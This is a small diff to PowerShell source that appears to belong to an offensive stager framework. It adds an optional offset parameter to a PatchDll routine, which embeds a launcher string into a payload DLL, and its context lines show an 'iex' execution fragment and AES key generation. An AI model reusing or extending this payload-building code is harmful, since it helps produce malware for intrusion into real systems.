@@ -772,7 +772,7 @@ primer | iex }'
         [System.Convert]::ToBase64String($aesManaged.Key)
     }
     function PatchDll {
-        param($dllBytes, $replaceString, $Arch)
+        param($dllBytes, $replaceString, $Arch, $offset)
 
         if ($Arch -eq 'x86') {
             $dllOffset = 0x00012F80
@@ -781,7 +781,10 @@ primer | iex }'
         if ($Arch -eq 'x64') {
             $dllOffset = 0x00017300
         }
-
+        if($offset) {
+            $dllOffset = $offset
+        }
+        
         # Patch DLL - replace 8000 A's
         $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
     
